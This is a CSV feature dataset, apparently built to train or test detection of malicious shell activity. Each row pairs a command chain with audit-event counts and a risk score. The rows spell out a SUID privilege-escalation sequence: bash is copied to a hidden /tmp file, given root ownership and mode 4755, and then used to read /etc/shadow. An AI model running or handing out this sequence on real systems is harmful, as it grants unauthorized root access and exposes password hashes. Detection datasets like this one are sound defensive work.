command_chain,count_read_event,count_write_event,count_sensitive_file_access_fails,count_socket_connect_event_successfully,count_socket_connect_event_fails,count_socket_create_event,count_file_modification_event_successfully,count_file_modification_event_fails,count_file_creation_event,count_link_event,count_symlink_event,count_dir_creation_event,count_dir_remove_event,count_mknod_create_event,count_rename_event,count_auth_event_successfully,count_auth_event_fails,count_passwd_change_event_successfully,count_passwd_change_event_fails,count_user_change_event_successfully,count_user_change_event_fails,count_do_not_update_atime,count_was_modified_time_changed,count_owner_changed,count_group_changed,count_suid_set,count_suid_cleared,count_sgid_set,count_sgid_cleared,count_sticky_set,count_sticky_cleared,count_user_write_added,count_user_write_removed,count_user_read_added,count_user_read_removed,count_user_exec_added,count_user_exec_removed,count_group_write_added,count_group_write_removed,count_group_exec_added,count_group_exec_removed,count_world_write_been_added,count_world_read_been_added,count_world_exec_been_added,count_external_ip,is_priviliged_port,count_sensitive_file,count_is_linked_to_sensitive_file,count_linked_file_SGID_or_SUID,count_atime_flag_been_set,count_modified_time_been_changed,is_current_dir_world_writable,is_target_dir_world_writable,is_in_memory_path,is_cross_user_link,is_dev_backdoor,is_fake_device,argv_has_network,argv_is_ip,argv_has_encoding,argv_is_net_tool,argv_is_sudo,argv_entropy,risk_score
./SUID_privillege_escalation.sh -> cp /bin/bash /tmp/.hidden_bash -> sudo chown root:root /tmp/.hidden_bash -> sudo -> sudo chmod 4755 /tmp/.hidden_bash -> ls -la /tmp/.hidden_bash -> /tmp/.hidden_bash -p -c cat /etc/shadow | head -n 1 -> cat /etc/shadow -> head -n 1,4,0,0,4,0,4,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,0,2,0,0,0,2,0,0,0,0,0,0,2,7,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,3.152517987157215,4.1838235157520485
cp /bin/bash /tmp/.hidden_bash,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2.910600848747558,1.86644948049818
sudo chown root:root /tmp/.hidden_bash -> sudo,1,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,1,0,0,0,1,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,3.054203092816881,2.997585632343491
chown root:root /tmp/.hidden_bash,0,0,0,4,0,4,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,4,3,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,3.0401449876117503,3.7959401547484686
sudo,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,0.0
sudo chmod 4755 /tmp/.hidden_bash -> sudo,1,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,1,0,0,0,1,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,3.109145822906535,2.9989557182420725
chmod 4755 /tmp/.hidden_bash,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,3.0919120135657105,1.8788474554305048
sudo,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,0.0
ls -la /tmp/.hidden_bash,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,3.0021097342752614,1.873501481056515
/tmp/.hidden_bash -p -c cat /etc/shadow | head -n 1 -> cat /etc/shadow -> head -n 1,0,0,0,2,0,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,3,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,3.074133503604034,3.385645974671286
cat /etc/shadow,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2.6768980082436835,1.8466341019468846
head -n 1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2.5073801024236357,1.8331716977198547
./SUID_privillege_escalation.sh -> cp /bin/bash /tmp/.hidden_bash -> sudo chown root:root /tmp/.hidden_bash,1,0,0,2,0,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,3.152517987157215,3.2420554493160028
cp /bin/bash /tmp/.hidden_bash,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2.910600848747558,1.86644948049818
sudo chown root:root /tmp/.hidden_bash,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,3.054203092816881,1.875962977431313
